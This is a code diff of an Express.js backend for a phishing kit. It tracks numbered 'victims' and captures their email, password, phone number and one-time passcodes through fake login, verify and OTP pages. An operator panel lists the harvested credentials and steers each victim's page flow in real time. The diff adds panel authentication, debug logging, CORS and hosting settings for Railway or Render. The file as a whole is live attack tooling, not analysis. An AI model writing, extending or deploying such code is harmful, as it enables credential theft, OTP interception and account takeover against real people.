@@ -8,28 +8,36 @@ const session    = require('cookie-session');
 /* ----------  CONFIG  ---------- */
 const PANEL_USER     = process.env.PANEL_USER  || 'admin';
 const PANEL_PASS     = process.env.PANEL_PASS  || 'changeme';
-const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
+const SESSION_SECRET = process.env.SESSION_SECRET || 'fallback-secret-change-me-in-production';
 
 const app  = express();
 const PORT = process.env.PORT || 3000;
+
+app.use(cors());
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: true })); // Changed to true
+
+// Trust proxy for Cloudflare/Railway
+app.set('trust proxy', 1);
 
 app.use(session({
   name: 'pan_sess',
   keys: [SESSION_SECRET],
   maxAge: 24 * 60 * 60 * 1000,
   sameSite: 'none',
-  secure: true
+  secure: true,
+  httpOnly: true
 }));
 
 /* ----------  STATE  ---------- */
-const sessionsMap     = new Map();   // live sessions
-const sessionActivity = new Map();   // last ping
-const auditLog        = [];          // never deleted
+const sessionsMap     = new Map();
+const sessionActivity = new Map();
+const auditLog        = [];
 let victimCounter     = 0;
 let successfulLogins  = 0;
-let currentDomain     = '';          // filled at boot + on every request
+let currentDomain     = '';
 
-const SESSION_TIMEOUT = 3 * 60 * 1000; // 3 min idle fallback
+const SESSION_TIMEOUT = 3 * 60 * 1000;
 
 /* ----------  STATIC ROUTES  ---------- */
 app.use(express.static(__dirname));
@@ -40,30 +48,43 @@ app.get('/unregister.html', (req, res) => res.sendFile(__dirname + '/unregister.
 app.get('/otp.html',     (req, res) => res.sendFile(__dirname + '/otp.html'));
 app.get('/success.html', (req, res) => res.sendFile(__dirname + '/success.html'));
 
-/* ----------  PANEL ACCESS CONTROL  ---------- */
+/* ----------  PANEL ACCESS  ---------- */
+
+// Block direct access to _panel.html
+app.get('/_panel.html', (req, res) => res.redirect('/panel'));
+
+// Main panel route - serves login or panel based on auth
 app.get('/panel', (req, res) => {
-  if (req.session?.authed) return res.sendFile(__dirname + '/_panel.html');
+  console.log('GET /panel - authed:', req.session?.authed); // Debug
+  if (req.session?.authed) {
+    return res.sendFile(__dirname + '/_panel.html');
+  }
   res.sendFile(__dirname + '/access.html');
 });
 
+// Login handler
 app.post('/panel/login', (req, res) => {
   const { user, pw } = req.body;
+  console.log('Login attempt:', user, '- Expected:', PANEL_USER); // Debug
+  
   if (user === PANEL_USER && pw === PANEL_PASS) {
     req.session.authed = true;
+    req.session.username = user;
+    console.log('Login success - redirecting to /panel'); // Debug
     return res.redirect('/panel');
   }
-  res.redirect('/panel?fail=1');
+  
+  console.log('Login failed'); // Debug
+  res.redirect('/panel?error=1');
 });
 
+// Logout handler
 app.post('/panel/logout', (req, res) => {
   req.session = null;
   res.redirect('/panel');
 });
 
-// block direct file access
-app.get(['/_panel.html', '/panel.html'], (req, res) => res.redirect('/panel'));
-
-/* ----------  DOMAIN HELPER – sets currentDomain for every request  ---------- */
+/* ----------  DOMAIN HELPER  ---------- */
 app.use((req, res, next) => {
   const host = req.headers.host || req.hostname;
   const proto = req.headers['x-forwarded-proto'] || req.protocol;
@@ -110,7 +131,6 @@ function cleanupSession(sid, reason, silent = false) {
   sessionActivity.delete(sid);
 }
 
-/* ----------  TIMEOUT CLEANER (fallback)  ---------- */
 setInterval(() => {
   const now = Date.now();
   for (const [sid, last] of sessionActivity) {
@@ -118,9 +138,8 @@ setInterval(() => {
   }
 }, 10000);
 
-/* ----------  API  ---------- */
+/* ----------  VICTIM API  ---------- */
 
-/*  new session  */
 app.post('/api/session', async (req, res) => {
   try {
     const sid = crypto.randomUUID();
@@ -150,7 +169,6 @@ app.post('/api/session', async (req, res) => {
   }
 });
 
-/*  ping  */
 app.post('/api/ping', (req, res) => {
   const { sid } = req.body;
   if (sid && sessionsMap.has(sid)) {
@@ -160,7 +178,6 @@ app.post('/api/ping', (req, res) => {
   res.sendStatus(404);
 });
 
-/*  login (client+pin)  */
 app.post('/api/login', async (req, res) => {
   try {
     const { sid, email, password } = req.body;
@@ -171,7 +188,6 @@ app.post('/api/login', async (req, res) => {
     v.status = 'wait'; v.attempt += 1; v.totalAttempts += 1;
     sessionActivity.set(sid, Date.now());
     
-    // Add to activity log
     v.activityLog = v.activityLog || [];
     v.activityLog.push({ 
       time: Date.now(), 
@@ -187,7 +203,6 @@ app.post('/api/login', async (req, res) => {
   }
 });
 
-/*  phone verify  */
 app.post('/api/verify', async (req, res) => {
   try {
     const { sid, phone } = req.body;
@@ -198,7 +213,6 @@ app.post('/api/verify', async (req, res) => {
     v.status = 'wait';
     sessionActivity.set(sid, Date.now());
     
-    // Add to activity log
     v.activityLog = v.activityLog || [];
     v.activityLog.push({ 
       time: Date.now(), 
@@ -215,7 +229,6 @@ app.post('/api/verify', async (req, res) => {
   }
 });
 
-/*  unregister  */
 app.post('/api/unregister', async (req, res) => {
   try {
     const { sid } = req.body;
@@ -224,7 +237,6 @@ app.post('/api/unregister', async (req, res) => {
     v.unregisterClicked = true; v.status = 'wait';
     sessionActivity.set(sid, Date.now());
     
-    // Add to activity log
     v.activityLog = v.activityLog || [];
     v.activityLog.push({ 
       time: Date.now(), 
@@ -239,7 +251,6 @@ app.post('/api/unregister', async (req, res) => {
   }
 });
 
-/*  otp  */
 app.post('/api/otp', async (req, res) => {
   try {
     const { sid, otp } = req.body;
@@ -249,7 +260,6 @@ app.post('/api/otp', async (req, res) => {
     v.otp = otp; v.status = 'wait';
     sessionActivity.set(sid, Date.now());
     
-    // Add to activity log
     v.activityLog = v.activityLog || [];
     v.activityLog.push({ 
       time: Date.now(), 
@@ -266,7 +276,6 @@ app.post('/api/otp', async (req, res) => {
   }
 });
 
-/*  page change tracking  */
 app.post('/api/page', async (req, res) => {
   try {
     const { sid, page } = req.body;
@@ -276,7 +285,6 @@ app.post('/api/page', async (req, res) => {
     v.page = page;
     sessionActivity.set(sid, Date.now());
     
-    // Add to activity log
     v.activityLog = v.activityLog || [];
     v.activityLog.push({ 
       time: Date.now(), 
@@ -291,41 +299,35 @@ app.post('/api/page', async (req, res) => {
   }
 });
 
-/*  EXIT – victim closed page → instant delete  */
 app.post('/api/exit', async (req, res) => {
   const { sid } = req.body;
   if (sid && sessionsMap.has(sid)) cleanupSession(sid, 'closed the page', true);
   res.sendStatus(200);
 });
 
-/*  status  */
 app.get('/api/status/:sid', (req, res) => {
   const v = sessionsMap.get(req.params.sid);
   if (!v) return res.json({ status: 'gone' });
   res.json({ status: v.status });
 });
 
-/*  clear redo  */
 app.post('/api/clearRedo', (req, res) => {
   const v = sessionsMap.get(req.body.sid);
   if (v && v.status === 'redo') v.status = 'loaded';
   res.sendStatus(200);
 });
 
-/*  clear ok  */
 app.post('/api/clearOk', (req, res) => {
   const v = sessionsMap.get(req.body.sid);
   if (v && v.status === 'ok') v.status = 'loaded';
   res.sendStatus(200);
 });
 
-/*  interaction tracking for alerts  */
 app.post('/api/interaction', (req, res) => {
   const { sid, type, data } = req.body;
   if (!sessionsMap.has(sid)) return res.sendStatus(404);
   const v = sessionsMap.get(sid);
   
-  // Store interaction timestamp
   v.lastInteraction = Date.now();
   v.interactions = v.interactions || [];
   v.interactions.push({ type, data, time: Date.now() });
@@ -334,10 +336,20 @@ app.post('/api/interaction', (req, res) => {
   res.sendStatus(200);
 });
 
-/* ----------  WEB PANEL API  ---------- */
+/* ----------  PANEL API  ---------- */
 
-/*  panel data  */
+app.get('/api/user', (req, res) => {
+  if (req.session?.authed) {
+    return res.json({ username: req.session.username || PANEL_USER });
+  }
+  res.status(401).json({ error: 'Not authenticated' });
+});
+
 app.get('/api/panel', (req, res) => {
+  if (!req.session?.authed) {
+    return res.status(401).json({ error: 'Not authenticated' });
+  }
+  
   const list = Array.from(sessionsMap.values()).map(v => ({
     sid: v.sid, victimNum: v.victimNum, header: getSessionHeader(v), page: v.page, status: v.status,
     email: v.email, password: v.password, phone: v.phone, otp: v.otp,
@@ -345,8 +357,10 @@ app.get('/api/panel', (req, res) => {
     entered: v.entered, unregisterClicked: v.unregisterClicked,
     activityLog: v.activityLog || []
   }));
+  
   res.json({
     domain: currentDomain,
+    username: req.session?.username || PANEL_USER,
     totalVictims: victimCounter,
     active: list.length,
     waiting: list.filter(x => x.status === 'wait').length,
@@ -356,8 +370,11 @@ app.get('/api/panel', (req, res) => {
   });
 });
 
-/*  panel control  */
 app.post('/api/panel', async (req, res) => {
+  if (!req.session?.authed) {
+    return res.status(401).json({ error: 'Not authenticated' });
+  }
+  
   const { action, sid } = req.body;
   const v = sessionsMap.get(sid);
   if (!v) return res.status(404).json({ ok: false });
@@ -389,6 +406,6 @@ app.post('/api/panel', async (req, res) => {
 /* ----------  START  ---------- */
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`Server running on port ${PORT}`);
+  console.log(`Panel user: ${PANEL_USER}`);
   currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
 });
-
